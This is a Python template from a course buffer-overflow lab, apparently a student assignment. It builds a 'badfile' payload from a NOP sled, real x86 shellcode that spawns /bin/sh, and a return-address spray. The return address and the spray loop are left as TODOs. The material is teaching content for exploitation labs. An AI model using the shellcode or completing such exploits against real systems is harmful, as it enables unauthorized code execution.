#!/usr/bin/python3
import sys

# Based on CS363 lecture (Section 4.6.1)
# Challenge 1: Unknown Buffer Size (Offset)
# We know Buffer Address A = 0xbfffea8c
# We spray the RT for the first 120 bytes.

shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# 1. Define payload sections
payload_size = 300
spray_section_S = 120
nop_sled_L = payload_size - spray_section_S # 180 bytes

# Create a NOP-filled array
content = bytearray(0x90 for i in range(payload_size))

# 2. Put shellcode at the very end
start_shellcode = payload_size - len(shellcode)
content[start_shellcode:] = shellcode

# 3. Calculate the Return Address (RT)
# Say we know &buffer = 0xbfffea8c (use gdb to find out)
# A = &buffer + 120 to compensate for the added depth by gdb
# The NOP sled starts *after* the spray section S.
# RT must point to the start of the NOP sled.
# RT = A + S
#
# TODO: CALCULATE THE 'ret' VALUE
ret = 0x00000000 
#
#
ret_bytes = (ret).to_bytes(4, byteorder='little')

# 4. "Spray" the RT over the entire Spray Section (S)
#
# TODO: WRITE A LOOP
# You need to write a loop that copies 'ret_bytes'
# into the 'content' array every 4 bytes,
# filling the entire 'spray_section_S' (120 bytes).
#
# for i in range(...):
#    content[... : ...] = ret_bytes
#

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)

print(f"badfile created with sprayed RT = {hex(ret)}")